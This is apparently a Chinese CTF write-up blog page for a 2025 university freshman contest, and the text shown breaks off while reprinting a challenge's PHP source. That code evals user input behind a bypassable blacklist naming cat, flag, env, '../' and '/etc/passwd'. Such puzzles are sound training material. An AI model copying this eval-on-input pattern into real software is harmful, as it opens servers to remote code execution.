<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="伊卡洛维奇"><meta name="copyright" content="伊卡洛维奇"><meta name="generator" content="Hexo 7.3.0"><meta name="theme" content="hexo-theme-yun"><title>2025whuctf新生赛 | Ikalovic@Hexo</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/png" href="/favicon.ico"><link rel="mask-icon" href="/favicon.ico" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"lunereal.1kal0vic.top","root":"/","title":"kawayi","version":"1.10.11","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><meta name="description" content="2025whuctf新生赛web[0-Div3]U5er0Agent根据提示输入&#x2F;source&#x3D;1查看源代码。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717">
<meta property="og:type" content="article">
<meta property="og:title" content="2025whuctf新生赛">
<meta property="og:url" content="http://lunereal.1kal0vic.top/2025/10/27/2025_whuctf%E6%96%B0%E7%94%9F%E8%B5%9B/index.html">
<meta property="og:site_name" content="Ikalovic@Hexo">
<meta property="og:description" content="2025whuctf新生赛web[0-Div3]U5er0Agent根据提示输入&#x2F;source&#x3D;1查看源代码。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://lunereal.1kal0vic.top/images/img/2025whuctf%E6%96%B0%E7%94%9F%E8%B5%9B/1.png">
<meta property="og:image" content="https://lunereal.1kal0vic.top/images/img/2025whuctf%E6%96%B0%E7%94%9F%E8%B5%9B/2.png">
<meta property="og:image" content="https://lunereal.1kal0vic.top/images/img/2025whuctf%E6%96%B0%E7%94%9F%E8%B5%9B/3.png">
<meta property="og:image" content="https://lunereal.1kal0vic.top/images/img/2025whuctf%E6%96%B0%E7%94%9F%E8%B5%9B/4.png">
<meta property="og:image" content="https://lunereal.1kal0vic.top/images/img/2025whuctf%E6%96%B0%E7%94%9F%E8%B5%9B/5.png">
<meta property="og:image" content="https://lunereal.1kal0vic.top/images/img/2025whuctf%E6%96%B0%E7%94%9F%E8%B5%9B/6.png">
<meta property="og:image" content="https://lunereal.1kal0vic.top/images/img/2025whuctf%E6%96%B0%E7%94%9F%E8%B5%9B/7.png">
<meta property="article:published_time" content="2025-10-27T14:00:23.000Z">
<meta property="article:modified_time" content="2025-10-29T00:34:05.795Z">
<meta property="article:author" content="伊卡洛维奇">
<meta property="article:tag" content="-web -misc">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://lunereal.1kal0vic.top/images/img/2025whuctf%E6%96%B0%E7%94%9F%E8%B5%9B/1.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="伊卡洛维奇"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="伊卡洛维奇"><span class="site-author-status" title="loli赛高">☺️</span></a><div class="site-author-name"><a href="/about/">伊卡洛维奇</a></div><span class="site-name">Ikalovic@Hexo</span><sub class="site-subtitle">kawayi</sub><div class="site-description">loli赛高</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">10</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">5</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">4</span></a></div><div class="site-state-item"><a href="/girls/"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:women-line"></span></span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange"><span class="icon iconify" data-icon="ri:rss-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/Ikalovic" title="GitHub" target="_blank" style="color:#181717"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/327357699" title="哔哩哔哩" target="_blank" style="color:#FF8EB3"><span class="icon iconify" data-icon="ri:bilibili-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2025whuctf%E6%96%B0%E7%94%9F%E8%B5%9B"><span class="toc-number">1.</span> <span class="toc-text">2025whuctf新生赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0-Div3-U5er0Agent"><span class="toc-number">1.1.1.</span> <span class="toc-text">[0-Div3]U5er0Agent</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Div3-%E4%BA%95%E5%AD%97%E6%A3%8B%E5%B0%8F%E6%B8%B8%E6%88%8F"><span class="toc-number">1.1.2.</span> <span class="toc-text">[1-Div3]井字棋小游戏</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Div1-ezUnser"><span class="toc-number">1.1.3.</span> <span class="toc-text">[1-Div1]ezUnser</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Div1-5-apacherrr"><span class="toc-number">1.1.4.</span> <span class="toc-text">[1-Div1.5]apacherrr</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Div2-Guild"><span class="toc-number">1.1.5.</span> <span class="toc-text">[3-Div2]Guild</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Div1-ZakoLogin"><span class="toc-number">1.1.6.</span> <span class="toc-text">[1-Div1]ZakoLogin</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">1.2.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0-Div3-%E7%8C%AB%E5%92%AA%E6%97%A5%E8%AE%B001"><span class="toc-number">1.2.1.</span> <span class="toc-text">[0-Div3]猫咪日记01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Div2-%E7%8C%AB%E5%92%AA%E6%97%A5%E8%AE%B002"><span class="toc-number">1.2.2.</span> <span class="toc-text">[1-Div2]猫咪日记02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Div1-%E7%8C%AB%E5%92%AA%E6%97%A5%E8%AE%B003"><span class="toc-number">1.2.3.</span> <span class="toc-text">[2-Div1]猫咪日记03</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%85%B3"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">第一关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%85%B3"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">第二关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%85%B3%EF%BC%88%E5%A4%A7%E7%9A%84%E8%A6%81%E6%9D%A5%E4%BA%86%EF%BC%89"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">第三关（大的要来了）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E5%85%B3%EF%BC%88%E5%A4%A7%E7%9A%84%E6%9D%A5%E4%BA%86%EF%BC%89"><span class="toc-number">1.2.3.4.</span> <span class="toc-text">第四关（大的来了）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%BC%E6%8E%A5%E7%A2%8E%E7%89%87%EF%BC%88ika%E7%9A%84%E5%8A%B2%E7%88%86%E5%B0%BE%E6%9D%80%EF%BC%89"><span class="toc-number">1.2.3.5.</span> <span class="toc-text">拼接碎片（ika的劲爆尾杀）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.2.4.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://lunereal.1kal0vic.top/2025/10/27/2025_whuctf%E6%96%B0%E7%94%9F%E8%B5%9B/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="伊卡洛维奇"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Ikalovic@Hexo"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">2025whuctf新生赛</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2025-10-27 22:00:23" itemprop="dateCreated datePublished" datetime="2025-10-27T22:00:23+08:00">2025-10-27</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2025-10-29 08:34:05" itemprop="dateModified" datetime="2025-10-29T08:34:05+08:00">2025-10-29</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E7%9F%A5%E8%AF%86%E7%A7%AF%E7%B4%AF/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">-知识积累</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/web-misc/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">-web -misc</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h1 id="2025whuctf新生赛"><a href="#2025whuctf新生赛" class="headerlink" title="2025whuctf新生赛"></a>2025whuctf新生赛</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="0-Div3-U5er0Agent"><a href="#0-Div3-U5er0Agent" class="headerlink" title="[0-Div3]U5er0Agent"></a>[0-Div3]U5er0Agent</h3><p>根据提示输入&#x2F;source&#x3D;1查看源代码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * 请求处理器类 - 安全API网关核心</span><br><span class="line"> * 版本: v2.1.4</span><br><span class="line"> * 环境: 生产环境</span><br><span class="line"> * 功能: 处理客户端请求，通过User-Agent头执行专门操作</span><br><span class="line"> */</span><br><span class="line">class RequestProcessor &#123;</span><br><span class="line">    /**</span><br><span class="line">     * 验证规则配置</span><br><span class="line">     * 包含输入验证的所有安全策略</span><br><span class="line">     */</span><br><span class="line">    private $validation_rules = [</span><br><span class="line">        // 模式黑名单 - 防止恶意输入</span><br><span class="line">        &#x27;pattern_blacklist&#x27; =&gt; [</span><br><span class="line">            // 主黑名单: 禁止cat、flag、env等敏感命令</span><br><span class="line">            &#x27;primary&#x27; =&gt; &#x27;/cat|flag|env/i&#x27;,</span><br><span class="line">            // 次黑名单: 防止路径遍历攻击</span><br><span class="line">            &#x27;secondary&#x27; =&gt; [&#x27;/\.\.\//&#x27;, &#x27;/\/etc\//&#x27;, &#x27;/\/passwd/&#x27;]</span><br><span class="line">        ],</span><br><span class="line">        // 最大输入长度限制</span><br><span class="line">        &#x27;max_length&#x27; =&gt; 1024,</span><br><span class="line">        // 允许的字符集正则表达式</span><br><span class="line">        &#x27;allowed_chars&#x27; =&gt; &#x27;/^[a-zA-Z0-9_\-\$\(\)\=\&lt;\&gt;\.\&#x27;\&quot;\s\;\\\:\+\*\?\[\]\&#123;\&#125;\|\/]+$/&#x27;</span><br><span class="line">    ];</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * 执行环境配置</span><br><span class="line">     * 存储系统执行环境参数</span><br><span class="line">     */</span><br><span class="line">    protected $execution_environment = [];</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * 审计日志</span><br><span class="line">     * 记录所有系统事件和安全相关操作</span><br><span class="line">     */</span><br><span class="line">    protected $audit_trail = [];</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * 构造函数</span><br><span class="line">     * 初始化系统和环境</span><br><span class="line">     */</span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        $this-&gt;initializeEnvironment();</span><br><span class="line">        $this-&gt;logEvent(&#x27;SYSTEM_INIT&#x27;, &#x27;Request processor initialized&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * 初始化执行环境</span><br><span class="line">     * 设置安全参数和系统限制</span><br><span class="line">     */</span><br><span class="line">    private function initializeEnvironment() &#123;</span><br><span class="line">        $this-&gt;execution_environment = [</span><br><span class="line">            &#x27;safe_mode&#x27; =&gt; false,          // 安全模式标志</span><br><span class="line">            &#x27;max_execution_time&#x27; =&gt; 5,     // 最大执行时间(秒)</span><br><span class="line">            &#x27;memory_limit&#x27; =&gt; &#x27;128M&#x27;       // 内存限制</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * 处理用户输入的主方法</span><br><span class="line">     * @param string $input_data 用户输入数据</span><br><span class="line">     * @return array 处理结果</span><br><span class="line">     */</span><br><span class="line">    public function processUserInput($input_data) &#123;</span><br><span class="line">        // 第一步: 输入验证</span><br><span class="line">        $validation_result = $this-&gt;validateInputString($input_data);</span><br><span class="line">        </span><br><span class="line">        if ($validation_result[&#x27;status&#x27;] === &#x27;VALID&#x27;) &#123;</span><br><span class="line">            // 验证通过: 记录成功日志并执行代码</span><br><span class="line">            $this-&gt;logEvent(&#x27;VALIDATION_PASS&#x27;, &#x27;Input validation successful&#x27;);</span><br><span class="line">            return $this-&gt;executeSecureCode($input_data);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // 验证失败: 记录失败日志并返回错误</span><br><span class="line">            $this-&gt;logEvent(&#x27;VALIDATION_FAIL&#x27;, $validation_result[&#x27;reason&#x27;]);</span><br><span class="line">            return $this-&gt;generateErrorResponse($validation_result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * 输入验证核心方法</span><br><span class="line">     * @param string $input 待验证的输入字符串</span><br><span class="line">     * @return array 验证结果</span><br><span class="line">     */</span><br><span class="line">    private function validateInputString($input) &#123;</span><br><span class="line">        // 检查1: 长度验证</span><br><span class="line">        if (strlen($input) &gt; $this-&gt;validation_rules[&#x27;max_length&#x27;]) &#123;</span><br><span class="line">            return [&#x27;status&#x27; =&gt; &#x27;INVALID&#x27;, &#x27;reason&#x27; =&gt; &#x27;Input exceeds maximum length&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        // 检查2: 字符集验证 - 只允许白名单中的字符</span><br><span class="line">        if (!preg_match($this-&gt;validation_rules[&#x27;allowed_chars&#x27;], $input)) &#123;</span><br><span class="line">            return [&#x27;status&#x27; =&gt; &#x27;INVALID&#x27;, &#x27;reason&#x27; =&gt; &#x27;Invalid characters detected&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        // 检查3: 主黑名单模式匹配 - 阻止明显恶意模式</span><br><span class="line">        if (preg_match($this-&gt;validation_rules[&#x27;pattern_blacklist&#x27;][&#x27;primary&#x27;], $input)) &#123;</span><br><span class="line">            return [&#x27;status&#x27; =&gt; &#x27;INVALID&#x27;, &#x27;reason&#x27; =&gt; &#x27;Restricted pattern detected&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        // 检查4: 次黑名单模式匹配 - 记录可疑模式但不阻止</span><br><span class="line">        foreach ($this-&gt;validation_rules[&#x27;pattern_blacklist&#x27;][&#x27;secondary&#x27;] as $pattern) &#123;</span><br><span class="line">            if (preg_match($pattern, $input)) &#123;</span><br><span class="line">                // 记录可疑活动但允许继续执行</span><br><span class="line">                $this-&gt;logEvent(&#x27;SUSPICIOUS_PATTERN&#x27;, &quot;Secondary pattern matched: $pattern&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        // 所有检查通过</span><br><span class="line">        return [&#x27;status&#x27; =&gt; &#x27;VALID&#x27;, &#x27;reason&#x27; =&gt; &#x27;All checks passed&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * 安全代码执行方法</span><br><span class="line">     * 使用eval执行经过验证的代码片段</span><br><span class="line">     * @param string $code_fragment 要执行的代码</span><br><span class="line">     * @return array 执行结果</span><br><span class="line">     */</span><br><span class="line">    private function executeSecureCode($code_fragment) &#123;</span><br><span class="line">        $this-&gt;logEvent(&#x27;EXECUTION_START&#x27;, &#x27;Beginning secure code execution&#x27;);</span><br><span class="line">        </span><br><span class="line">        try &#123;</span><br><span class="line">            // 执行用户提供的代码 - 这是潜在的安全风险点</span><br><span class="line">            eval($code_fragment);</span><br><span class="line">            $this-&gt;logEvent(&#x27;EXECUTION_COMPLETE&#x27;, &#x27;Code execution finished&#x27;);</span><br><span class="line">            </span><br><span class="line">            return [&#x27;status&#x27; =&gt; &#x27;SUCCESS&#x27;, &#x27;message&#x27; =&gt; &#x27;Execution completed&#x27;];</span><br><span class="line">        &#125; catch (ParseError $e) &#123;</span><br><span class="line">            // 语法错误捕获</span><br><span class="line">            return [&#x27;status&#x27; =&gt; &#x27;ERROR&#x27;, &#x27;message&#x27; =&gt; &#x27;Syntax error in input&#x27;];</span><br><span class="line">        &#125; catch (Throwable $e) &#123;</span><br><span class="line">            // 运行时错误捕获</span><br><span class="line">            return [&#x27;status&#x27; =&gt; &#x27;ERROR&#x27;, &#x27;message&#x27; =&gt; &#x27;Runtime error occurred&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * 事件日志记录方法</span><br><span class="line">     * @param string $event_type 事件类型</span><br><span class="line">     * @param string $event_description 事件描述</span><br><span class="line">     */</span><br><span class="line">    private function logEvent($event_type, $event_description) &#123;</span><br><span class="line">        $log_entry = [</span><br><span class="line">            &#x27;timestamp&#x27; =&gt; microtime(true),        // 高精度时间戳</span><br><span class="line">            &#x27;event_type&#x27; =&gt; $event_type,           // 事件类型标识</span><br><span class="line">            &#x27;description&#x27; =&gt; $event_description,   // 详细描述</span><br><span class="line">            &#x27;client_ip&#x27; =&gt; $_SERVER[&#x27;REMOTE_ADDR&#x27;] ?? &#x27;unknown&#x27;  // 客户端IP</span><br><span class="line">        ];</span><br><span class="line">        </span><br><span class="line">        // 添加到审计日志数组</span><br><span class="line">        array_push($this-&gt;audit_trail, $log_entry);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * 生成错误响应</span><br><span class="line">     * 将内部错误信息转换为对用户友好的消息</span><br><span class="line">     * @param array $validation_result 验证结果</span><br><span class="line">     * @return array 错误响应</span><br><span class="line">     */</span><br><span class="line">    private function generateErrorResponse($validation_result) &#123;</span><br><span class="line">        // 错误消息映射表 - 避免向用户泄露敏感信息</span><br><span class="line">        $error_templates = [</span><br><span class="line">            &#x27;Input exceeds maximum length&#x27; =&gt; &#x27;Payload size violation&#x27;,</span><br><span class="line">            &#x27;Invalid characters detected&#x27; =&gt; &#x27;Character set violation&#x27;, </span><br><span class="line">            &#x27;Restricted pattern detected&#x27; =&gt; &#x27;Content policy violation&#x27;,</span><br><span class="line">            &#x27;Syntax error in input&#x27; =&gt; &#x27;Execution syntax error&#x27;,</span><br><span class="line">            &#x27;Runtime error occurred&#x27; =&gt; &#x27;Execution runtime error&#x27;</span><br><span class="line">        ];</span><br><span class="line">        </span><br><span class="line">        // 获取对用户友好的错误消息</span><br><span class="line">        $public_message = $error_templates[$validation_result[&#x27;reason&#x27;]] ?? &#x27;Processing error&#x27;;</span><br><span class="line">        </span><br><span class="line">        return [</span><br><span class="line">            &#x27;status&#x27; =&gt; &#x27;ERROR&#x27;,</span><br><span class="line">            &#x27;public_message&#x27; =&gt; $public_message,           // 用户可见消息</span><br><span class="line">            &#x27;internal_code&#x27; =&gt; bin2hex(random_bytes(4))    // 内部追踪代码</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * 获取系统状态信息</span><br><span class="line">     * @return array 系统状态数据</span><br><span class="line">     */</span><br><span class="line">    public function getSystemStatus() &#123;</span><br><span class="line">        return [</span><br><span class="line">            &#x27;version&#x27; =&gt; &#x27;2.1.4&#x27;,                          // 